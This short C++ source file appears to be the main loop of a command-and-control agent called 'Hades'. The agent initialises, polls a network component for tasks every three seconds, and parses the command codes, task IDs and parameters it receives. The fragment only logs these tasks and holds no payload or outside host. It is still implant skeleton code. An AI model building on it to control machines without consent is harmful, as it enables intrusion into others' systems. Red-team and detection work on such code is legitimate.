#include "hades.h"
#include <stdio.h>


BOOL RunHades() {

	if (!InitAgent()) {
		DEBUG_LOG("Failed Loading\n");
		return FALSE;
	}

	PBYTE buf = AllocMemory<BYTE>(BASE_BUFFER_SIZE);
	UINT capacity = BASE_BUFFER_SIZE;
	UINT finalSize = 0;
	while (TRUE) {
		
		if (!g_Network->GetTask(&buf, BASE_BUFFER_SIZE, &finalSize, &capacity)) {
			DEBUG_LOG("Failed!");
		}
		DEBUG_LOG("Capacity = %d\nFinal Size = %d\n", capacity, finalSize);

		g_ByteMgr->InitRead(buf, finalSize);
		UINT Count = g_ByteMgr->Read4();
		for (int i = 0; i < Count; i++) {
			UINT CmdCode  = g_ByteMgr->Read4();
			UINT TaskID   = g_ByteMgr->Read4();
			UINT ParamLen = g_ByteMgr->Read4();

			PBYTE buf = AllocMemory<BYTE>(ParamLen);
			g_ByteMgr->ReadString(buf, ParamLen);
			DEBUG_LOG("Total: %d\nCode: %d\nTaskID: %d\n ParamLen: %d\n\tParam: %s\n", Count, CmdCode, TaskID, ParamLen,buf);

		}
		Sleep(3000);
	}
}


Hades* hades = NULL;